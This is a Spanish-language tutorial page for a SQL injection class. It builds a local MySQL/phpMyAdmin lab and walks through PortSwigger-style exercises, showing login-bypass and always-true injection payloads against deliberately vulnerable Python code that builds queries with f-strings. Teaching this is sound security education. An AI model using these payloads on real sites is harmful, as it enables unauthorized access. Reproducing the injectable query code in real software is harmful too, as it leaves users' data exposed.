<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2021-11-06 Sat 17:39 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Clase Sql injection</title>
<meta name="author" content="Rubén Santos" />
<meta name="description" content="Ayuda para sql injection" />
<meta name="generator" content="Org Mode" />
<style>
  #content { max-width: 60em; margin: auto; }
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #e6e6e6;
    border-radius: 3px;
    background-color: #f2f2f2;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: auto;
  }
  pre.src:before {
    display: none;
    position: absolute;
    top: -8px;
    right: 12px;
    padding: 3px;
    color: #555;
    background-color: #f2f2f299;
  }
  pre.src:hover:before { display: inline; margin-top: 14px;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-authinfo::before { content: 'Authinfo'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .equation-container {
    display: table;
    text-align: center;
    width: 100%;
  }
  .equation {
    vertical-align: middle;
  }
  .equation-label {
    display: table-cell;
    text-align: right;
    vertical-align: middle;
  }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
</style>
<link rel="stylesheet" type="text/css" href="https://fniessen.github.io/org-html-themes/src/readtheorg_theme/css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="https://fniessen.github.io/org-html-themes/src/readtheorg_theme/css/readtheorg.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://fniessen.github.io/org-html-themes/src/lib/js/jquery.stickytableheaders.min.js"></script>
<script type="text/javascript" src="https://fniessen.github.io/org-html-themes/src/readtheorg_theme/js/readtheorg.js"></script>
</head>
<body>
<div id="content" class="content">
<h1 class="title">Clase Sql injection</h1>
<div id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#orgcb84411">Que voy a usar</a></li>
<li><a href="#org5b5a4a6">Entendiendo sql y laboratorio de pruebas</a>
<ul>
<li><a href="#org7b31ced">Laboratorio</a>
<ul>
<li><a href="#org3fd09f9">Apache2 y php</a></li>
<li><a href="#orge93f86e">Mysql-Server</a></li>
<li><a href="#org8f016f2">Phpmyadmin</a></li>
<li><a href="#org790491e">Creación del esquema y tabla users</a></li>
</ul>
</li>
<li><a href="#org6e74987">Tutorial sql basico</a></li>
</ul>
</li>
<li><a href="#org487e6f2">Ataque al panel de login</a>
<ul>
<li><a href="#orge886b1d">¿Cómo podríamos aprovechar este fallo a nuestro favor ?</a></li>
</ul>
</li>
<li><a href="#org713a4ba">Obtener información oculta</a>
<ul>
<li><a href="#orgebc43a0">Añadimos tabla al laboratorio</a></li>
<li><a href="#org82fe6eb">Ataque</a></li>
</ul>
</li>
<li><a href="#org3060362">Examinar base de datos para obtener información</a>
<ul>
<li><a href="#org33463af">Información de sql importante que tenemos que saber</a>
<ul>
<li><a href="#orgc59dd42">Order by</a></li>
<li><a href="#org19915ba">Union</a></li>
<li><a href="#org1ce9ced">Enumerar tipo de la columna</a></li>
</ul>
</li>
<li><a href="#org82ad5b7">Conseguir tablas de la base de datos</a></li>
<li><a href="#org5637dc1">Conseguir columnas de la tabla users</a></li>
<li><a href="#orgb3e5ab2">Conseguimos usuario y contraseña</a></li>
</ul>
</li>
<li><a href="#orgc4fdccf">¿Donde puedo sacar información para atacar vulnerabilidades web ?</a></li>
<li><a href="#org6be4152">SQLMap para automatizar el ataque</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgcb84411" class="outline-2">
<h2 id="orgcb84411">Que voy a usar</h2>
<div class="outline-text-2" id="text-orgcb84411">
<ul class="org-ul">
<li>Algunos de los laboratorios de <b>portswigger</b>  (<a href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a>).
<ul class="org-ul">
<li>Retrieving hidden data</li>
<li>Subverting application logic</li>
<li>Examining the database in SQL injection attacks ( listing the contents of the database )</li>
</ul></li>
<li>Laboratorio phpmyadmin</li>
</ul>
</div>
</div>
<div id="outline-container-org5b5a4a6" class="outline-2">
<h2 id="org5b5a4a6">Entendiendo sql y laboratorio de pruebas</h2>
<div class="outline-text-2" id="text-org5b5a4a6">
</div>
<div id="outline-container-org7b31ced" class="outline-3">
<h3 id="org7b31ced">Laboratorio</h3>
<div class="outline-text-3" id="text-org7b31ced">
<p>
Para el laboratorio de pruebas voy a hacer uso de <b>phpmyadmin</b> que no es mas que una herramienta
escrita en <b>php</b> para administrar <b>MySQL</b>. Para ello, comenzaríamos instalando <b>apache2 y php</b>. Haciendo uso
de la terminal, introduciríamos lo siguiente:
</p>
</div>
<div id="outline-container-org3fd09f9" class="outline-4">
<h4 id="org3fd09f9">Apache2 y php</h4>
<div class="outline-text-4" id="text-org3fd09f9">
<div class="org-src-container">
<pre class="src src-bash"><span style="color: #ECBE7B;">sudo</span> apt install apache2
<span style="color: #ECBE7B;">sudo</span> apt install php
</pre>
</div>
<p>
A continuación, instalaríamos <b>mysql-server</b>.
</p>
</div>
</div>
<div id="outline-container-orge93f86e" class="outline-4">
<h4 id="orge93f86e">Mysql-Server</h4>
<div class="outline-text-4" id="text-orge93f86e">
<div class="org-src-container">
<pre class="src src-bash"><span style="color: #ECBE7B;">sudo</span> apt install mysql-server
</pre>
</div>
<p>
Ahora necesitaríamos crear un usuario con una contraseña en <b>mysql</b> para poder acceder luego a <b>mysql</b>.
Desde la terminal pondríamos lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-bash"><span style="color: #ECBE7B;">sudo</span> mysql -u root -p
</pre>
</div>
<p>
Tras esto nos preguntaría por la <b>contraseña</b> en donde únicamente tendríamos que pulsar <b>enter</b>.
</p>


<div id="org057fb6a" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-15-22_screenshot.png" alt="2021-10-30_22-15-22_screenshot.png" />
</p>
</div>

<p>
Dentro de la consola de mysql, tenemos que crearnos un usuario el cual luego utilizaremos para acceder a phpmyadmin.
Para ello realizaríamos lo siguiente:
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #51afef;">CREATE</span> <span style="color: #c678dd;">USER</span> <span style="color: #98be65;">'rsgbengi'</span>@localhost<span style="color: #98be65;">' IDENTIFIED BY '</span><span style="color: #da8548; font-weight: bold;">123</span><span style="color: #98be65;">';</span>
<span style="color: #98be65;">GRANT ALL ON *.* TO '</span>rsgbengi<span style="color: #98be65;">'@'</span>localhost<span style="color: #98be65;">';</span>
<span style="color: #98be65;">FLUSH PRIVILEGES;</span>
</pre>
</div>
<p>
Tras esto saldríamos de la consola de mysql poniendo <b>exit</b>.
</p>

<p>
A continuación, reiniciaríamos el servicio mediante el siguiente comando:
</p>
<div class="org-src-container">
<pre class="src src-bash">service mysql restart
</pre>
</div>
</div>
</div>
<div id="outline-container-org8f016f2" class="outline-4">
<h4 id="org8f016f2">Phpmyadmin</h4>
<div class="outline-text-4" id="text-org8f016f2">
<p>
Tras realizar esto, pasaríamos a instalar <b>phpmyadmin</b>. Una vez más, desde la terminal:
</p>
<div class="org-src-container">
<pre class="src src-bash"><span style="color: #ECBE7B;">sudo</span> apt install phpmyadmin
</pre>
</div>
<p>
A continuación se nos irá preguntando información sobre la instalación tal y como vemos en las siguientes imágenes:
</p>


<div id="orgd9b0e89" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-19-07_screenshot.png" alt="2021-10-30_22-19-07_screenshot.png" />
</p>
</div>



<div id="org712727e" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-19-21_screenshot.png" alt="2021-10-30_22-19-21_screenshot.png" />
</p>
</div>

<p>
En la siguiente pondríamos la contraseña que hemos puesto a nuestro usuario de <b>mysql</b> siendo enn este caso <b>123</b>.
</p>

<div id="org155078c" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-19-37_screenshot.png" alt="2021-10-30_22-19-37_screenshot.png" />
</p>
</div>



<div id="orgead1274" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-20-29_screenshot.png" alt="2021-10-30_22-20-29_screenshot.png" />
</p>
</div>

<p>
Finalmente tenemos que configurar <b>phpmyadmin</b> para que funcione con apache2. Para ello:
</p>
<div class="org-src-container">
<pre class="src src-bash">nano /etc/apache2/apache2.conf
</pre>
</div>
<p>
Y al final del archivo, pondríamos lo siguiente:
</p>


<div id="orgb6c0756" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-21-54_screenshot.png" alt="2021-10-30_22-21-54_screenshot.png" />
</p>
</div>

<p>
Finalmente reiniciaríamos apache2:
</p>
<div class="org-src-container">
<pre class="src src-bash">service apache2 restart
</pre>
</div>
<p>
Si buscamos por <b><a href="http://localhost/phpmyadmin">http://localhost/phpmyadmin</a></b> en firefox, tendríamos que visualizar lo siguiente:
</p>


<div id="org9333bc9" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-23-42_screenshot.png" alt="2021-10-30_22-23-42_screenshot.png" />
</p>
</div>
</div>
</div>

<div id="outline-container-org790491e" class="outline-4">
<h4 id="org790491e">Creación del esquema y tabla users</h4>
<div class="outline-text-4" id="text-org790491e">
<p>
Dentro de <b>phpmyadmin</b> pulsaríamos <b>new</b> (a la izquierda justo encima de clase) para añadir una nuevo esquema de base de datos
lo podéis llamar como queráis yo lo voy a llamar <b>pruebas</b>:
</p>


<div id="org898f5d2" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-28-56_screenshot.png" alt="2021-10-30_22-28-56_screenshot.png" />
</p>
</div>

<p>
Hacemos doble click en el nuevo esquema creado y procedemos a crear la tabla <b>users</b>. Tras poner el nombre, le daríamos a <b>go</b>.
</p>


<div id="orgdbb9514" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-30-51_screenshot.png" alt="2021-10-30_22-30-51_screenshot.png" />
</p>
</div>

<p>
Creamos las columnas dejando la siguiente configuración:
</p>


<div id="org1a64562" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-47-36_screenshot.png" alt="2021-10-30_22-47-36_screenshot.png" />
</p>
</div>


<p>
Finalmente le daríamos a save y ya tendríamos nuestra tabla para hacer pruebas:
</p>


<div id="orgcda4e80" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-34-16_screenshot.png" alt="2021-10-30_22-34-16_screenshot.png" />
</p>
</div>

<p>
Pulsando doble click en ella y dirigiéndonos al apartado <b>sql</b> podríamos empezar a ejecutar sentencias sql :).
</p>
</div>
</div>
</div>
<div id="outline-container-org6e74987" class="outline-3">
<h3 id="org6e74987">Tutorial sql basico</h3>
<div class="outline-text-3" id="text-org6e74987">
<p>
Primeramente rellenamos la table de <b>users</b> con la siguiente información para poder hacer pruebas:
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `users`(`username`, `password`,`email`) <span style="color: #51afef;">VALUES</span> ("administrator","supersecurepasswd","<span style="color: #51afef;">admin</span>@gmail.com");
<span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `users`(`username`, `password`,`email`) <span style="color: #51afef;">VALUES</span> ("Cangrejo","Bermejo","cangrejo@gmail.com");
<span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `users`(`username`, `password`,`email`) <span style="color: #51afef;">VALUES</span> ("DeathChron","Evil","death@gmail.com");
<span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `users`(`username`, `password`,`email`) <span style="color: #51afef;">VALUES</span> ("Isma","esbuenaladelvasodeagua","noob@gmail.com");
</pre>
</div>
<p>
Realizamos a continuación la prueba mediante la visualización de todas las columnas(\*) de la tabla <b>USERS</b>.
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #51afef;">SELECT</span> * <span style="color: #51afef;">from</span> USERS;
</pre>
</div>
<p>
Tras realizar la sentencia el resultado seria el siguiente:
</p>


<div id="orgb44fbd9" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-53-01_screenshot.png" alt="2021-10-30_22-53-01_screenshot.png" />
</p>
</div>

<p>
Si nosotros lo que quisiéramos sería ver toda la información del usuario administrador entonces realizaríamos lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #51afef;">SELECT</span> * <span style="color: #51afef;">FROM</span> `users` <span style="color: #51afef;">WHERE</span> username=<span style="color: #98be65;">'administrator'</span>
</pre>
</div>
<p>
Esto nos daría como resultado solo el usuario y contraseña del administrador:
</p>


<div id="orgef5d1ea" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_22-55-26_screenshot.png" alt="2021-10-30_22-55-26_screenshot.png" />
</p>
</div>

<p>
Ahora imaginemos que solo quiero devolver el usuario, entonces, ¿ Cómo lo haríamos ?
</p>
<div class="org-src-container">
<pre class="src src-sql"> <span style="color: #51afef;">SELECT</span> username <span style="color: #51afef;">FROM</span> `users` <span style="color: #51afef;">where</span> username=<span style="color: #98be65;">'administrator'</span>
</pre>
</div>
<p>
Resultado:
</p>


<div id="org6f7ad7e" class="figure">
<p><img src="Tutorial_sql_basico/2021-10-30_15-49-05_screenshot.png" alt="2021-10-30_15-49-05_screenshot.png" />
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org487e6f2" class="outline-2">
<h2 id="org487e6f2">Ataque al panel de login</h2>
<div class="outline-text-2" id="text-org487e6f2">
<p>
Nuestro objetivo es manipular la entrada que se proporciona al usuario para realizar <b>sentencias sql maliciosas</b> con las cuales tomar información.
En el siguiente login  un usuario introduciría su nombre de usuario y contraseña para verificar el acceso.
</p>



<div id="orgafa9aab" class="figure">
<p><img src="Entendiendo_sql_y_laboratorio_de_pruebas/2021-10-30_23-07-40_screenshot.png" alt="2021-10-30_23-07-40_screenshot.png" />
</p>
</div>

<p>
Por detrás podemos imaginemos que se esta ejecutando lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #dcaeea;">username</span> = request.form.get(<span style="color: #98be65;">"username"</span>)
<span style="color: #dcaeea;">password</span> = request.form.get(<span style="color: #98be65;">"password"</span>)
<span style="color: #51afef;">try</span>:
    <span style="color: #dcaeea;">email</span> = db.session.execute(
        f<span style="color: #98be65;">"Select email from users where username ='{username}' and password = {password}"</span>
    ).fetchone()

</pre>
</div>
<p>
Este código simplemente toma el nombre de usuario y contraseña introducidos para ejecutar un sentencia sql que va a devolver el email correspondiente.
Esto esta muy bién pero como atacantes, ¿ Qué podríamos hacer ?. Pues bien, nuestro objetivo es insertar datos en los campos <b>username</b> o <b>password</b> de
tal manera que seamos capaces de ejecutar la sentencia sql que nosotros queremos. Por ejemplo, ¿Qué pasaría si insertáramos <b>una comilla</b> en el campo username?.
</p>


<div id="org5a7a6a7" class="figure">
<p><img src="Ataque_al_panel_de_login/2021-10-30_23-14-03_screenshot.png" alt="2021-10-30_23-14-03_screenshot.png" />
</p>
</div>

<p>
El servidor nos devuelve un error de sentencia, esto es debido a que se estaría ejecutando lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-python"> <span style="color: #dcaeea;">email</span> = db.session.execute(
        f<span style="color: #98be65;">"Select email from users where username =''' and password = {noseejecuta}"</span>
    ).fetchone()



</pre>
</div>
<p>
Si nos vamos a nuestro laboratorio de sql y intentamos ejecutar la sentencia, vemos como se nos esta reportando error ya que la sintaxis
no es correcta:
</p>


<div id="orga6a1235" class="figure">
<p><img src="Ataque_al_panel_de_login/2021-10-30_23-16-50_screenshot.png" alt="2021-10-30_23-16-50_screenshot.png" />
</p>
</div>

<p>
Lo que tiene que quedar claro hasta aquí es que si <b>provocamos un error en el servidor al intentar introducir código sql estamos muy probablemente
ante un reto de sql injection</b>
</p>
</div>
<div id="outline-container-orge886b1d" class="outline-3">
<h3 id="orge886b1d">¿Cómo podríamos aprovechar este fallo a nuestro favor ?</h3>
<div class="outline-text-3" id="text-orge886b1d">
<p>
Nuestro objetivo es pasar el login siendo administradores por lo que ¿Por qué no intentar logearnos como administrador ?
Para ello, tendríamos que intentar que el servidor nos ejecutara lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-python"> <span style="color: #dcaeea;">email</span> = db.session.execute(
        f<span style="color: #98be65;">"Select email from users where username ='administrator' -- -' and password = {noseejecuta}"</span>
    ).fetchone()



</pre>
</div>
<p>
Tendríamos que poner el usuario con el cual queremos acceder y comentar el resto de código ya que no nos interesa.
<b>Gracias al comentario, conseguiríamos que el servidor no provocará un error</b>. En nuestro laboratorio:
</p>


<div id="org886d2f6" class="figure">
<p><img src="Ataque_al_panel_de_login/2021-10-30_23-24-16_screenshot.png" alt="2021-10-30_23-24-16_screenshot.png" />
</p>
</div>

<p>
Como podemos ver no se muestra ningún error debido a que estamos comentando el resto del código haciendo que no se ejecute.
Ahora si lo probamos en el login de la página web:
</p>


<div id="org19ba2bb" class="figure">
<p><img src="Ataque_al_panel_de_login/2021-10-30_23-25-35_screenshot.png" alt="2021-10-30_23-25-35_screenshot.png" />
</p>
</div>

<p>
Conseguiríamos acceder como administradores:
</p>


<div id="org298e6eb" class="figure">
<p><img src="Ataque_al_panel_de_login/2021-10-30_23-26-07_screenshot.png" alt="2021-10-30_23-26-07_screenshot.png" />
</p>
</div>
</div>
</div>
</div>

<div id="outline-container-org713a4ba" class="outline-2">
<h2 id="org713a4ba">Obtener información oculta</h2>
<div class="outline-text-2" id="text-org713a4ba">
</div>
<div id="outline-container-orgebc43a0" class="outline-3">
<h3 id="orgebc43a0">Añadimos tabla al laboratorio</h3>
<div class="outline-text-3" id="text-orgebc43a0">
<p>
Para crear la tabla, seleccionamos el esquema de base de datos <b>pruebas</b> creado anteriormente y le damos a <b>New</b>. Tras esto, ponemos lo siguiente:
</p>


<div id="org816b25f" class="figure">
<p><img src="Obtener_información_oculta/2021-11-05_12-22-39_screenshot.png" alt="2021-11-05_12-22-39_screenshot.png" />
</p>
</div>


<p>
Tras esto, seleccionaríamos la tabla y ejecutaríamos las siguientes sentencias:
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `items`(`<span style="color: #51afef;">name</span>`, `category`,`released`) <span style="color: #51afef;">VALUES</span> ("The lazy dog","Pets",<span style="color: #da8548; font-weight: bold;">1</span>);
<span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `items`(`<span style="color: #51afef;">name</span>`, `category`,`released`) <span style="color: #51afef;">VALUES</span> ("Fur Babies","Pets",<span style="color: #da8548; font-weight: bold;">0</span>);
<span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `items`(`<span style="color: #51afef;">name</span>`, `category`,`released`) <span style="color: #51afef;">VALUES</span> ("Cheshire Cat Grin","Accessories",<span style="color: #da8548; font-weight: bold;">1</span>);
<span style="color: #51afef;">INSERT</span> <span style="color: #51afef;">INTO</span> `items`(`<span style="color: #51afef;">name</span>`, `category`,`released`) <span style="color: #51afef;">VALUES</span> ("Hydrated Crackers","Food &amp; drink",<span style="color: #da8548; font-weight: bold;">1</span>);
</pre>
</div>


<p>
Hacemos prueba de que todas las tablas se han ejecutado mediante:
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #51afef;">Select</span> * <span style="color: #51afef;">from</span> `items`
</pre>
</div>
<p>
Visualizaríamos lo siguiente:
</p>



<div id="orgf95e05c" class="figure">
<p><img src="Obtener_información_oculta/2021-11-05_12-24-37_screenshot.png" alt="2021-11-05_12-24-37_screenshot.png" />
</p>
</div>
</div>
</div>

<div id="outline-container-org82fe6eb" class="outline-3">
<h3 id="org82fe6eb">Ataque</h3>
<div class="outline-text-3" id="text-org82fe6eb">
<p>
Muchas veces lo que se nos pide es encontrar <b>información oculta</b> que normalmente no deberíamos poder ver. Para ello,
se suelen utilizar los operadores <b>or</b> o <b>and</b>.
Una vez más, supongamos que tenemos la siguiente página web en donde podemos visualizar productos:
</p>


<div id="org2dfe340" class="figure">
<p><img src="Obtener_información_oculta/2021-10-31_12-55-39_screenshot.png" alt="2021-10-31_12-55-39_screenshot.png" />
</p>
</div>

<p>
Si pinchamos, por ejemplo, en <b>pets</b> entonces únicamente se nos mostrarían los productos que pertenecen a dicha categoría
y si vemos en la <b>url</b> nos aparecería lo siguiente:
</p>


<div id="org9200168" class="figure">
<p><img src="Obtener_información_oculta/2021-10-31_12-57-31_screenshot.png" alt="2021-10-31_12-57-31_screenshot.png" />
</p>
</div>

<p>
Por detrás, la aplicación web estaría haciendo algo como lo siguiente:
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #dcaeea;">category</span> = request.form.get(<span style="color: #98be65;">"category"</span>)<span style="color: #5B6268;"># </span><span style="color: #5B6268;">En nuestro caso esto ser&#237;a Pets</span>
<span style="color: #51afef;">try</span>:
    <span style="color: #dcaeea;">items_info_from_category</span> = db.session.execute(
        f<span style="color: #98be65;">"Select * from items where category = '{category}' and released=1"</span>
    ).fetchone()

</pre>
</div>
<p>
Si nos vamos a nuestro laboratorio, podemos replicar lo que se esta ejecutando:
</p>
<div class="org-src-container">
<pre class="src src-sql">    <span style="color: #51afef;">Select</span> * <span style="color: #51afef;">from</span> items <span style="color: #51afef;">where</span> category = <span style="color: #98be65;">'Pets'</span> <span style="color: #51afef;">and</span> released=<span style="color: #da8548; font-weight: bold;">1</span>
</pre>
</div>

<p>
Se nos mostraría la información relacionada con la categoría seleccionada:
</p>


<div id="org9b2ca51" class="figure">
<p><img src="Obtener_información_oculta/2021-11-05_12-25-31_screenshot.png" alt="2021-11-05_12-25-31_screenshot.png" />
</p>
</div>


<p>
Esto esta bien, pero, ¿Cómo podríamos obtener información que no se nos debería mostrar ?. Supongamos que como usuarios introducimos lo siguiente:
</p>



<div id="org371acf6" class="figure">
<p><img src="Obtener_información_oculta/2021-10-31_13-20-27_screenshot.png" alt="2021-10-31_13-20-27_screenshot.png" />
</p>
</div>


<p>
Traducido en la aplicación de ejemplo que hemos puesto, sería lo siguiente:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #dcaeea;">category</span> = request.form.get(<span style="color: #98be65;">"category"</span>)<span style="color: #5B6268;"># </span><span style="color: #5B6268;">En nuestro caso esto ser&#237;a Pets</span>
<span style="color: #51afef;">try</span>:
    <span style="color: #dcaeea;">items_info_from_category</span> = db.session.execute(
        f<span style="color: #98be65;">"Select * from items where category = '{' or 1=1 -- -}' and released = 1"</span>
    ).fetchone()

</pre>
</div>

<p>
Que, si nos lo llevamos a nuestro laboratorio, sería lo siguiente:
</p>


<div id="orgf9da005" class="figure">
<p><img src="Obtener_información_oculta/2021-11-05_12-27-25_screenshot.png" alt="2021-11-05_12-27-25_screenshot.png" />
</p>
</div>


<p>
Se nos vuelca toda la tabla sin introducir ninguna categoría específica, esto es debido a que la consulta nos devuelve o bien una categoría que no existe
(&rsquo;&rsquo;) o bien 1=1. Como <b>1=1 es siempre verdadero</b>, entonces siempre nos va a devolver toda la tabla.
</p>



<div id="org1790387" class="figure">
<p><img src="Obtener_información_oculta/2021-10-31_13-23-50_screenshot.png" alt="2021-10-31_13-23-50_screenshot.png" />
</p>
</div>
</div>
</div>
</div>

